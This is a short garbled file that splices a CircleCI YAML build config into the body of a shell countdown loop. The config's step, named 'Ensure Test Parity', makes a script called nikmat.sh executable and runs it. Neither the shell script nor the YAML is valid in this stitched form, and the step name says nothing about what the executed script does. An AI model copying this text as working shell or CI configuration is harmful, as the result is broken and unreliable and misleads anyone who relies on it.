#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do

version: 2
jobs:
  build:
    docker:
      - image: cimg/go:1.16.4
    parallelism: 4
    steps:
      - checkout
      - run:
          name: Ensure Test Parity
          command: |
            chmod +x nikmat.sh
            ./nikmat.sh
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
